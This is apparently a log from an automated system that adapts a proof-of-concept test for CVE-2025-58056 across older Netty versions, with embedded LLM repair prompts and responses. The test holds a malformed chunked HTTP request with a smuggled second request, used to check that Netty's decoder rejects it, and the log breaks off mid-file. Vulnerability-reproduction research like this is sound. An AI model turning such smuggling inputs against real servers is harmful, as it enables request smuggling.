[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.14.Beta1[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.14.Beta1[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.13.Final[0m
[96m[Selector] Closest reproduced version: 4.0.14.Beta1 at index 34[0m
[96m[Adapter] Trying next closest version: 4.0.13.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.14.Beta1/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.13.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.13.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.13.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.13.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.13.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.13.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.13.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.13.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.13.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.12.Final[0m
[96m[Selector] Closest reproduced version: 4.0.13.Final at index 33[0m
[96m[Adapter] Trying next closest version: 4.0.12.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.13.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.12.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.12.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.12.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.12.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.12.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.12.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.12.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.12.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.12.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.11.Final[0m
[96m[Selector] Closest reproduced version: 4.0.12.Final at index 32[0m
[96m[Adapter] Trying next closest version: 4.0.11.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.12.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.11.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.11.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.11.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.11.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.11.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.11.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.11.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[92m[Verifier] âœ“ Behavior matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ Detail matched: 'java.lang.AssertionError'[0m
[92m[Verifier] âœ“ All reproduction indicators matched.[0m
[92m[Executor] Reproduction result: Success[0m
[92m[Executor] Direct reproduction successful on 4.0.11.Final[0m
[96m[Adapter] Copied successful adaptation to /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.11.Final[0m
[96m[Selector] Nearest need adapatation version selected: 4.0.10.Final[0m
[96m[Selector] Closest reproduced version: 4.0.11.Final at index 31[0m
[96m[Adapter] Trying next closest version: 4.0.10.Final[0m
[96m[Preparer] Using exploit from valid: /PoCAdaptation/exploit/valid/CVE-2025-58056/4.0.11.Final/exploit[0m
[92m[Preparer] Copied exploit to: /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.10.Final/exploit[0m
[96m[Preparer] Updating dependency version to 4.0.10.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.10.Final/exploit/pom.xml[0m
[92m[Preparer] Updated dependency version to 4.0.10.Final in /PoCAdaptation/exploit/pending/CVE-2025-58056/4.0.10.Final/exploit/pom.xml[0m
[96m[Executor] Attempting direct exploit execution on 4.0.10.Final...[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.10.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[96m[Adapter] Attempting adaptation from base version 4.0.11.Final to 4.0.10.Final...[0m
[96m[Adapter] Start adapting exploit from 4.0.11.Final to 4.0.10.Final"[0m
[91m[DiffManager] Diff file not found: /PoCAdaptation/library/diff/CVE-2025-58056/4.0.10.Final-4.0.11.Final.diff[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.10.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 12 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[43,37] method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: java.lang.String[0m
[92m[ErrorManager] Processing line: [ERROR]   found: java.lang.String,java.lang.String,boolean[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1847 (prompt), 1 (completion), 1848 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 4.0.10.Final:io.netty:netty-codec-http.
This test file compiles and runs successfully with version 4.0.11.Final.

Your task is to:
1. Analyze why this issue occurs with the *4.0.11.Final* but not with the *4.0.10.Final version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------------< com.example:demo >--------------------------
[INFO] Building demo 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:3.1.0:clean (default-clean) @ demo ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:resources (default-resources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:compile (default-compile) @ demo ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:testResources (default-testResources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:testCompile (default-testCompile) @ demo ---
[INFO] Changes detected - recompiling the module!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[43,37] method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types;
  required: java.lang.String
  found: java.lang.String,java.lang.String,boolean
  reason: actual and formal argument lists differ in length
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.878 s
[INFO] Finished at: 2025-09-25T06:03:05Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[43,37] method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types;
[ERROR]   required: java.lang.String
[ERROR]   found: java.lang.String,java.lang.String,boolean
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.example</groupId>
  <artifactId>demo</artifactId>
  <version>1.0-SNAPSHOT</version>

  <name>demo</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
  </properties>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.10</version>
      <scope>test</scope>
    </dependency>
    
    <dependency>
        <groupId>io.netty</groupId>
        <artifactId>netty-codec-http</artifactId>
        <version>4.0.10.Final</version>
    </dependency>
        
  </dependencies>

  <build>
    <pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) -->
      <plugins>
        <!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle -->
        <plugin>
          <artifactId>maven-clean-plugin</artifactId>
          <version>3.1.0</version>
        </plugin>
        <!-- default lifecycle, jar packaging: see https://maven.apache.org/ref/current/maven-core/default-bindings.html#Plugin_bindings_for_jar_packaging -->
        <plugin>
          <artifactId>maven-resources-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-compiler-plugin</artifactId>
          <version>3.8.0</version>
        </plugin>
        <plugin>
          <artifactId>maven-surefire-plugin</artifactId>
          <version>2.22.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-jar-plugin</artifactId>
          <version>3.0.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-install-plugin</artifactId>
          <version>2.5.2</version>
        </plugin>
        <plugin>
          <artifactId>maven-deploy-plugin</artifactId>
          <version>2.8.2</version>
        </plugin>
        <!-- site lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#site_Lifecycle -->
        <plugin>
          <artifactId>maven-site-plugin</artifactId>
          <version>3.7.1</version>
        </plugin>
        <plugin>
          <artifactId>maven-project-info-reports-plugin</artifactId>
          <version>3.0.0</version>
        </plugin>
      </plugins>
    </pluginManagement>
  </build>
</project>

[LLMClient] Response: 
test
[96m[Adapter] LLM response for fix position: test[0m
[Adapter] Grouped Errors: {'method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String,boolean reason: actual and formal argument lists differ in length |': [{'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 43, 'column': 37, 'message': 'method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String,boolean reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false));'}]}
[LLMClient] Tokens used: 186 (prompt), 4 (completion), 190 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 4.0.10.Final: 

Error: method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String,boolean reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 4.0.11.Final 

Error code:         assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false)); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
HttpHeaders;contains
[96m[ErrorManager] Extracted key entities: ['HttpHeaders', 'contains'][0m
[96m[Adapter] Try to solve error: {'file': '/PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java', 'line': 43, 'column': 37, 'message': 'method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String,boolean reason: actual and formal argument lists differ in length', 'symbol': None, 'location': None, 'code_line': '        assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false));'} with cause: ['HttpHeaders', 'contains'][0m
[LLMClient] Tokens used: 207 (prompt), 4 (completion), 211 (total)
[LLMClient] Prompt: 
You are given an error log when executing 'mvn test' in version 4.0.10.Final: 

Error: method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String,boolean reason: actual and formal argument lists differ in length, None, None 

The test executes as expected in 4.0.11.Final 

Error code:         assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false)); 

Extract two key *entities* from the error for searching related diffs 

The extracted entities should reflect code-level identifiers that are likely to appear in source code or diffs. 

Current cause: ['HttpHeaders', 'contains'] 

 failed to catch, try simpler or other entities.

Output each node as a `;`-separated list, with no explanations. 


[LLMClient] Response: 
HttpHeaders;contains
[96m[ErrorManager] Extracted key entities: ['HttpHeaders', 'contains'][0m
[96m[Adapter] Related diffs for error: [][0m
[96m[Adapter] Fix position is in test code.[0m
[96m[RepairModule] Start repair for group: method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String,boolean reason: actual and formal argument lists differ in length | cause: ['HttpHeaders', 'contains'][0m
[96m[RepairModule] Trying best diff #None with score 0.00[0m
[96m[RepairModule] Found 0 diff combinations for annealing.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: No diff selected.[0m
[96m[RepairModule] Iteration 1, temperature 1.000: Trying diff #None with score 0.00[0m
[93m[RepairModule] Diff #None content empty[0m
[LLMClient] Tokens used: 718 (prompt), 453 (completion), 1171 (total)
[LLMClient] Prompt: 
You are given a Java test file with compilation errors in version 4.0.10.Final:io.netty:netty-codec-http.
This test file compiles and runs successfully in 4.0.11.Final.

The diff is related to the diff.
Your task has three steps:
 1. Locate the code where the compilation error occurs.
 2. Analyze the diff from 4.0.11.Final to 4.0.10.Final.
 3. Fix the error in the error position only when diff is helpful. Add import statement when needed according to the diff. 

Only output the modified version of the test file according to the diff. No explanations. If mocking, access fields via reflection if they exist.
### Compilation Errors:
message: method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String,boolean reason: actual and formal argument lists differ in length, symble: None, location: None

### Error Position:
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false));

### Related Diff:


### Test File Content:
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked", false));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.getDecoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}


[LLMClient] Response: 
```java
package com.example;


import static org.junit.Assert.assertFalse;
import static org.junit.Assert.assertThat;
import static org.junit.Assert.assertTrue;

import java.util.Collections;

import org.junit.Test;

import io.netty.buffer.Unpooled;
import io.netty.channel.embedded.EmbeddedChannel;
import io.netty.handler.codec.DecoderResult;
import io.netty.handler.codec.http.DefaultHttpHeaders;
import io.netty.handler.codec.http.HttpContent;
import io.netty.handler.codec.http.HttpRequestDecoder;
import io.netty.handler.codec.http.HttpRequest;
import io.netty.util.CharsetUtil;

public class Testcase1 {



    @Test
    public void testHeaderWithNoValueAndMissingColon() throws Exception {
       String requestStr = "GET /one HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "2;\n" + // Chunk size followed by illegal single newline (not preceded by carraige return)
                "xx\r\n" +
                "45\r\n" +
                "0\r\n\r\n" +
                "GET /two HTTP/1.1\r\n" +
                "Host: localhost\r\n" +
                "Transfer-Encoding: chunked\r\n\r\n" +
                "0\r\n\r\n";
        EmbeddedChannel channel = new EmbeddedChannel(new HttpRequestDecoder());
        assertTrue(channel.writeInbound(Unpooled.copiedBuffer(requestStr, CharsetUtil.US_ASCII)));
        HttpRequest request = (HttpRequest) channel.readInbound();
        assertFalse(request.getDecoderResult().isFailure()); // We parse the headers just fine.
        assertTrue(request.headers().names().contains("Transfer-Encoding"));
        assertTrue(request.headers().contains("Transfer-Encoding", "chunked"));
        HttpContent content = (HttpContent) channel.readInbound();
        DecoderResult decoderResult = content.getDecoderResult();
        assertTrue(decoderResult.isFailure()); // But parsing the chunk must fail.
    }

}
```
[96m[RepairModule] Wrote modified code to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.10.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 12 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[43,37] method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: java.lang.String[0m
[92m[ErrorManager] Processing line: [ERROR]   found: java.lang.String,java.lang.String[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[RepairModule] Old grouped keys: {'method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String,boolean reason: actual and formal argument lists differ in length |'}
[RepairModule] New grouped keys: {'method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length |'}
[93m[RepairModule] [Analyzer] New error:
  File     : /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java
  Line     : 43, Column: 37
  Message  : method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String reason: actual and formal argument lists differ in length
  Symbol   : None
  Location : None
  Code     : assertTrue(request.headers().contains("Transfer-Encoding", "chunked"));
  Position : same the fixing line (43)[0m
[92m[RepairModule] Error method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types; required: java.lang.String found: java.lang.String,java.lang.String,boolean reason: actual and formal argument lists differ in length resolved after applying diff.[0m
[92m[RepairModule] Repair success with diff #None at iteration 1![0m
[96m[Adapter] Test code repair attempted.[0m
[96m[Executor] Executing exploit for CVE-2025-58056 on version 4.0.10.Final...[0m
[96m[Verifier] Verifying reproduction...[0m
[91m[Verifier] âœ— Behavior not found: 'java.lang.AssertionError'[0m
[91m[Executor] Reproduction result: Failure[0m
[ErrorManager] Extracting errors from log with 12 lines.
[96m[ErrorManager] Ignoring line: [ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure[0m
[92m[ErrorManager] Processing line: [ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[43,37] method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types;[0m
[92m[ErrorManager] Processing line: [ERROR]   required: java.lang.String[0m
[92m[ErrorManager] Processing line: [ERROR]   found: java.lang.String,java.lang.String[0m
[92m[ErrorManager] Processing line: [ERROR]   reason: actual and formal argument lists differ in length[0m
[96m[ErrorManager] Ignoring line: [ERROR] -> [Help 1][0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.[0m
[96m[ErrorManager] Ignoring line: [ERROR] Re-run Maven using the -X switch to enable full debug logging.[0m
[96m[ErrorManager] Ignoring line: [ERROR][0m
[96m[ErrorManager] Ignoring line: [ERROR] For more information about the errors and possible solutions, please read the following articles:[0m
[96m[ErrorManager] Ignoring line: [ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException[0m
[96m[Adapter] Locating fix position in error log.[0m
[LLMClient] Tokens used: 1843 (prompt), 1 (completion), 1844 (total)
[LLMClient] Prompt: 
You are given a Java error log when executing 'mvn test' in a project with dependency version 4.0.10.Final:io.netty:netty-codec-http.
This test file compiles and runs successfully with version 4.0.11.Final.

Your task is to:
1. Analyze why this issue occurs with the *4.0.11.Final* but not with the *4.0.10.Final version*.
2. Consider how to resolve the issue **without updating this library**.
3. Determine and output the location in the project that should be modified to fix the problem.

Please return 'pom' if the fix is in the pom.xml file, or 'test' if the fix is in the test code.
Do not return any other text, just 'pom' or 'test'.

The error log is:
[INFO] Scanning for projects...
[INFO] 
[INFO] --------------------------< com.example:demo >--------------------------
[INFO] Building demo 1.0-SNAPSHOT
[INFO]   from pom.xml
[INFO] --------------------------------[ jar ]---------------------------------
[INFO] 
[INFO] --- maven-clean-plugin:3.1.0:clean (default-clean) @ demo ---
[INFO] Deleting /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/target
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:resources (default-resources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/main/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:compile (default-compile) @ demo ---
[INFO] No sources to compile
[INFO] 
[INFO] --- maven-resources-plugin:3.0.2:testResources (default-testResources) @ demo ---
[INFO] Using 'UTF-8' encoding to copy filtered resources.
[INFO] skip non existing resourceDirectory /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/resources
[INFO] 
[INFO] --- maven-compiler-plugin:3.8.0:testCompile (default-testCompile) @ demo ---
[INFO] Changes detected - recompiling the module!
[INFO] Compiling 1 source file to /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/target/test-classes
[INFO] -------------------------------------------------------------
[ERROR] COMPILATION ERROR : 
[INFO] -------------------------------------------------------------
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[43,37] method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types;
  required: java.lang.String
  found: java.lang.String,java.lang.String
  reason: actual and formal argument lists differ in length
[INFO] 1 error
[INFO] -------------------------------------------------------------
[INFO] ------------------------------------------------------------------------
[INFO] BUILD FAILURE
[INFO] ------------------------------------------------------------------------
[INFO] Total time:  0.908 s
[INFO] Finished at: 2025-09-25T06:03:40Z
[INFO] ------------------------------------------------------------------------
[ERROR] Failed to execute goal org.apache.maven.plugins:maven-compiler-plugin:3.8.0:testCompile (default-testCompile) on project demo: Compilation failure
[ERROR] /PoCAdaptation/exploit/result/CVE-2025-58056/4.0.10.Final/exploit/src/test/java/edu/vision/se/Testcase1.java:[43,37] method contains in class io.netty.handler.codec.http.HttpHeaders cannot be applied to given types;
[ERROR]   required: java.lang.String
[ERROR]   found: java.lang.String,java.lang.String
[ERROR]   reason: actual and formal argument lists differ in length
[ERROR] -> [Help 1]
[ERROR] 
[ERROR] To see the full stack trace of the errors, re-run Maven with the -e switch.
[ERROR] Re-run Maven using the -X switch to enable full debug logging.
[ERROR] 
[ERROR] For more information about the errors and possible solutions, please read the following articles:
[ERROR] [Help 1] http://cwiki.apache.org/confluence/display/MAVEN/MojoFailureException


current_pom file is:<?xml version="1.0" encoding="UTF-8"?>

<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
  <modelVersion>4.0.0</modelVersion>

  <groupId>com.example</groupId>
  <artifactId>demo</artifactId>
  <version>1.0-SNAPSHOT</version>

  <name>demo</name>
  <!-- FIXME change it to the project's website -->
  <url>http://www.example.com</url>

  <properties>
    <project.build.sourceEncoding>UTF-8</project.build.sourceEncoding>
    <maven.compiler.source>1.8</maven.compiler.source>
    <maven.compiler.target>1.8</maven.compiler.target>
  </properties>

  <dependencies>
    <dependency>
      <groupId>junit</groupId>
      <artifactId>junit</artifactId>
      <version>4.10</version>
      <scope>test</scope>
    </dependency>
    
    <dependency>
        <groupId>io.netty</groupId>
        <artifactId>netty-codec-http</artifactId>
        <version>4.0.10.Final</version>
    </dependency>
        
  </dependencies>

  <build>
    <pluginManagement><!-- lock down plugins versions to avoid using Maven defaults (may be moved to parent pom) -->
      <plugins>
        <!-- clean lifecycle, see https://maven.apache.org/ref/current/maven-core/lifecycles.html#clean_Lifecycle -->
        <plugin>
          <artifactId>maven-clean-plugin</artifactId>
